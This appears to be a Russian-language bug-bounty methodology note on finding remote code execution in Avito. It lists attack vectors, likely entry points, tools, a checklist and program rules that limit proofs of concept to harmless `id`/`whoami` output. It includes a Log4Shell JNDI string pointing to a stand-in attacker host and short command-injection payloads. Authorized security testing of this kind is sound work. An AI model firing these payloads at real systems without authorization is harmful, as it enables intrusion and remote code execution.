# RCE — Avito

## Что ищем
Server-side Remote Code Execution — самая высокооплачиваемая категория.

## Векторы
- **Десериализация:** Java (ysoserial), PHP (phpggc), Python (pickle), .NET (ysoserial.net), Node.js (node-serialize)
- **Template injection (SSTI):** Jinja2, Twig, Freemarker, Velocity, Handlebars, EJS
- **Expression Language:** SpEL, OGNL, MVEL
- **File upload → RCE:** webshell, .htaccess, polyglot, SVG с XXE, DOCX с макросом
- **Log4Shell / JNDI:** `jndi:ldap://attacker.com/a`
- **ImageMagick / GhostScript:** обработка изображений и PDF
- **Command injection:** `; id`, `| id`, `$(id)`, backticks
- **Path traversal → LFI → RCE:** wrappers `php://filter`, log poisoning

## Где искать
- Загрузка файлов (аватарки, фото объявлений, резюме в HR)
- Генерация PDF / превью
- Импорт объявлений (XML/YML-фиды от партнёров, Maxposter)
- Интеграции с 1С, CRM, HR-системами
- GraphQL mutation с file upload
- API-эндпоинты, принимающие сериализованные данные

## Ограничения Avito
- **Никаких reverse shell с persistence**
- **Никаких cryptominer'ов**
- **Никаких destructive payload'ов** (`rm -rf`, шифрование)
- PoC — только безопасное выполнение (`id`, `whoami`, `hostname`)
- Не выходить за пределы тестового тенанта/аккаунта

## Инструменты
- ysoserial, ysoserial.net, phpggc
- tplmap (SSTI)
- JNDI-Exploit-Kit
- Burp Collaborator / interactsh

## Чек-лист
- [ ] Найти все точки загрузки файлов
- [ ] Проверить обработку изображений (ImageMagick, ghostscript)
- [ ] Проверить SSTI в шаблонах (email, PDF, отчёты)
- [ ] Проверить десериализацию (Java/PHP/Node) в cookies, API
- [ ] Проверить JNDI (Log4j) во всех заголовках и параметрах
- [ ] Проверить command injection в интеграциях (ping, curl, ffmpeg)

## Не делать
- Не оставлять webshell
- Не выполнять `id > /tmp/pwned` или другие следы
- В PoC — только вывод `id`/`whoami` в ответе
